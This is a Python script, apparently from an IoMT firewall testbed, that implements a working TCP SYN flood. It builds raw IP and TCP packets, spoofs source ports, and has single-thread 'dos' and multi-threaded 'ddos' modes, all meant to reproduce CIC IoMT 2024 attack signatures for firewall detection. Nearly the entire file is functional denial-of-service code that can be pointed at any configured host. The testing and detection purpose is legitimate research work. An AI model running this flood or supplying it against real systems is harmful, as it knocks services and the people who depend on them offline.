"""
syn_flood_client.py — TCP SYN flood attack.

Sends a rapid stream of TCP SYN packets with spoofed source ports using a raw
socket, generating the TCP_IP-DoS-SYN (serial) and TCP_IP-DDoS-SYN (parallel)
signatures from the CIC IoMT 2024 dataset.

Requires root (raw socket):
  sudo python attack_clients/syn_flood_client.py

Note: The default firewall iptables rules capture TCP on port 1883.
SYN packets to port 1883 will already be caught by the existing INPUT rule.
To also capture SYN floods to other ports add an iptables rule accordingly.

Two modes:
  --mode dos    Single thread (TCP_IP-DoS-SYN).
  --mode ddos   Many threads concurrently (TCP_IP-DDoS-SYN).

Network signature the firewall should detect:
  - Extremely high SYN count, near-zero ACK/data
  - Very high Srate, near-zero Drate (broker never completes handshake)
  - Weight ≈ 0 (bwd = 0 packets when spoofed; minimal ACK when not spoofed)
  - Short flow duration

Environment variables:
  SYN_FLOOD_TARGET_IP    Destination IP (default: GATEWAY_IP)
  SYN_FLOOD_TARGET_PORT  Destination port (default: 1883)
  SYN_FLOOD_THREADS      Threads for ddos mode (default: 10)
  SYN_FLOOD_SPOOF        1 = randomise source port each packet (default: 1)
  ATTACK_RATE_HZ         Packets per second per thread (0 = max, default: 0)
  ATTACK_BURST_COUNT     Stop after N total packets (0 = infinite, default: 0)
  GATEWAY_IP
"""

from __future__ import annotations

import os
import random
import socket
import struct
import sys
import threading
import time
from pathlib import Path

from dotenv import load_dotenv

load_dotenv(dotenv_path=Path(__file__).resolve().parents[1] / ".env")

GATEWAY_IP  = os.getenv("GATEWAY_IP", "127.0.0.1")
TARGET_IP   = os.getenv("SYN_FLOOD_TARGET_IP", GATEWAY_IP)
TARGET_PORT = int(os.getenv("SYN_FLOOD_TARGET_PORT", "1883"))
NUM_THREADS = int(os.getenv("SYN_FLOOD_THREADS", "10"))
SPOOF       = os.getenv("SYN_FLOOD_SPOOF", "1") == "1"
RATE_HZ     = float(os.getenv("ATTACK_RATE_HZ", "0"))
BURST_COUNT = int(os.getenv("ATTACK_BURST_COUNT", "0"))

_total_lock = threading.Lock()
_total_sent = 0
_stop_event = threading.Event()


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack(f"!{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def _build_syn_packet(src_ip: str, src_port: int) -> bytes:
    # ── TCP header ──────────────────────────────────────────────────────────────
    seq       = random.randint(0, 0xFFFFFFFF)
    ack_seq   = 0
    doff_res  = (5 << 4)
    flags     = 0x02   # SYN
    window    = 65535
    urgent    = 0

    tcp_hdr = struct.pack(
        "!HHLLBBHHH",
        src_port, TARGET_PORT, seq, ack_seq,
        doff_res, flags, window, 0, urgent,
    )

    src_bytes = socket.inet_aton(src_ip)
    dst_bytes = socket.inet_aton(TARGET_IP)
    pseudo    = struct.pack("!4s4sBBH", src_bytes, dst_bytes, 0, 6, len(tcp_hdr))
    chk       = _checksum(pseudo + tcp_hdr)

    tcp_hdr = struct.pack(
        "!HHLLBBHHH",
        src_port, TARGET_PORT, seq, ack_seq,
        doff_res, flags, window, chk, urgent,
    )

    # ── IP header ───────────────────────────────────────────────────────────────
    ip_len    = 20 + len(tcp_hdr)
    ip_id     = random.randint(0, 0xFFFF)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        (4 << 4) | 5, 0, ip_len, ip_id, 0,
        64, socket.IPPROTO_TCP, 0, src_bytes, dst_bytes,
    )
    ip_chk    = _checksum(ip_header)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        (4 << 4) | 5, 0, ip_len, ip_id, 0,
        64, socket.IPPROTO_TCP, ip_chk, src_bytes, dst_bytes,
    )

    return ip_header + tcp_hdr


def _flood_loop(thread_id: int, src_ip: str) -> None:
    global _total_sent
    sleep_s = 1.0 / RATE_HZ if RATE_HZ > 0 else 0

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("[SYN-FLOOD] ERROR: raw socket requires root. Run with sudo.", file=sys.stderr)
        _stop_event.set()
        return

    try:
        while not _stop_event.is_set():
            src_port = random.randint(1024, 65535) if SPOOF else (40000 + thread_id)
            pkt = _build_syn_packet(src_ip, src_port)
            try:
                sock.sendto(pkt, (TARGET_IP, 0))
            except OSError:
                time.sleep(0.01)
                continue

            with _total_lock:
                _total_sent += 1
                n = _total_sent

            if n % 1000 == 0:
                print(f"[SYN-FLOOD] thread={thread_id:03d}  total_sent={n}")

            if BURST_COUNT > 0 and n >= BURST_COUNT:
                _stop_event.set()
                break

            if sleep_s:
                time.sleep(sleep_s)
    finally:
        sock.close()


def _get_src_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "127.0.0.1"


def run_dos() -> None:
    src_ip = _get_src_ip()
    print(f"[SYN-FLOOD] Mode: dos (TCP_IP-DoS-SYN)  "
          f"src: {src_ip}  target: {TARGET_IP}:{TARGET_PORT}  spoof_ports: {SPOOF}")
    try:
        _flood_loop(0, src_ip)
    except KeyboardInterrupt:
        _stop_event.set()
    print(f"[SYN-FLOOD] Done. Total packets: {_total_sent}")


def run_ddos() -> None:
    src_ip = _get_src_ip()
    print(f"[SYN-FLOOD] Mode: ddos (TCP_IP-DDoS-SYN)  threads: {NUM_THREADS}  "
          f"target: {TARGET_IP}:{TARGET_PORT}  spoof_ports: {SPOOF}")
    threads = [
        threading.Thread(target=_flood_loop, args=(i, src_ip), daemon=True)
        for i in range(NUM_THREADS)
    ]
    try:
        for t in threads:
            t.start()
        while not _stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        _stop_event.set()

    for t in threads:
        t.join(timeout=2)
    print(f"[SYN-FLOOD] Done. Total packets: {_total_sent}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="TCP SYN flood (requires root)")
    parser.add_argument("--mode", choices=["dos", "ddos"], default="dos",
                        help="dos: single thread | ddos: multi-thread (default: dos)")
    args = parser.parse_args()

    if args.mode == "ddos":
        run_ddos()
    else:
        run_dos()
